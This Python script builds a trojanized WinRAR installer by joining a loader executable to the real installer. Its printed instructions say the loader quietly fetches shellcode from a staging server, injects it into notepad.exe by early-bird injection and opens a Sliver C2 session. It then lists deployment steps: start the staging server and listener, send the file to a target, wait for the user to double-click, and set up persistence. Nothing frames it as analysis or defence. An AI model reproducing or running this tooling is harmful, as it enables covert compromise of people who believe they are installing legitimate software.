#!/usr/bin/env python3
"""
build_installer.py - Inject loader into WinRAR installer

Combines loader_embed.exe with WinRAR installer via marker.
Result is a fully functional WinRAR installer that runs loader in background
to fetch and execute implant from staging server.

Usage:
    python3 build_installer.py --installer winrar_x64.exe --output winrar_installer.exe

Output:
    winrar_installer.exe (single EXE ready to deploy)
"""

import argparse
import os
import struct
import sys

MARKER = b"\x49\x4e\x4a\x45\x43\x54\x5a\x5a"  # INJECTZZ


def check_pe_file(filepath):
    """Check if file is a valid Windows PE (MZ header)."""
    if not os.path.exists(filepath):
        return False
    with open(filepath, "rb") as f:
        return f.read(2) == b"MZ"


def create_installer(loader_exe, installer_exe, output_exe):
    """Combine loader + installer with marker."""
    
    if not check_pe_file(loader_exe):
        print(f"[!] Invalid PE file: {loader_exe}")
        return False
    
    if not check_pe_file(installer_exe):
        print(f"[!] Invalid PE file: {installer_exe}")
        return False
    
    try:
        with open(loader_exe, "rb") as f:
            loader_data = f.read()
        
        with open(installer_exe, "rb") as f:
            installer_data = f.read()
        
        installer_size = len(installer_data)
        size_bytes = struct.pack("<I", installer_size)
        
        # Format: [LOADER][MARKER][SIZE][INSTALLER]
        final_data = loader_data + MARKER + size_bytes + installer_data
        
        with open(output_exe, "wb") as f:
            f.write(final_data)
        
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="Inject loader into WinRAR installer",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    python3 build_installer.py
    python3 build_installer.py --installer winrar_x64.exe --output winrar_installer.exe

Prerequisites:
    1. Build loader first: python3 build_loader.py
    2. Ensure loader_embed.exe and winrar_x64.exe exist
        """
    )
    parser.add_argument("--loader", default="loader_embed.exe", help="Loader EXE (default: loader_embed.exe)")
    parser.add_argument("--installer", default="winrar_x64.exe", help="WinRAR installer (default: winrar_x64.exe)")
    parser.add_argument("--output", default="winrar_installer.exe", help="Output EXE (default: winrar_installer.exe)")
    args = parser.parse_args()

    print("=" * 60)
    print("BUILD INSTALLER - Inject Loader into WinRAR")
    print("=" * 60)
    print()
    
    if not os.path.exists(args.loader):
        print(f"[!] Loader not found: {args.loader}")
        print("    Build loader first: python3 build_loader.py")
        return 1
    
    if not os.path.exists(args.installer):
        print(f"[!] Installer not found: {args.installer}")
        print("    Download from: https://rarlab.com/rar/winrar-x64-624.exe")
        return 1
    
    print(f"Loader:    {args.loader}")
    print(f"Installer: {args.installer}")
    print(f"Output:    {args.output}")
    print()
    
    print("Merging files...")
    if create_installer(args.loader, args.installer, args.output):
        if os.path.exists(args.output):
            size = os.path.getsize(args.output)
            print(f"OK: {args.output} ({size:,} bytes)")
            print()
            print("=" * 60)
            print("BUILD SUCCESS")
            print("=" * 60)
            print()
            print("How it works:")
            print("  1. Extract embedded WinRAR installer to %TEMP%")
            print("  2. Run WinRAR wizard (foreground, UAC prompt)")
            print("  3. Background: loader fetches shellc.bin from staging server")
            print("  4. Background: early bird injection into notepad.exe")
            print("  5. Session appears in Sliver (process: Notepad.exe)")
            print("  6. Installer exits, session stays alive in notepad")
            print()
            print("Deploy:")
            print("  1. Start staging server: python3 -m http.server <STAGING_PORT>")
            print("  2. Start Sliver listener: http -L <C2_IP> -l <C2_PORT>")
            print("  3. Transfer winrar_installer.exe to target")
            print("  4. User double-clicks")
            print()
            print("Next step after session appears:")
            print("  Setup persistence immediately (see README.md step 6)")
            print()
            return 0
    
    return 1


if __name__ == "__main__":
    sys.exit(main())
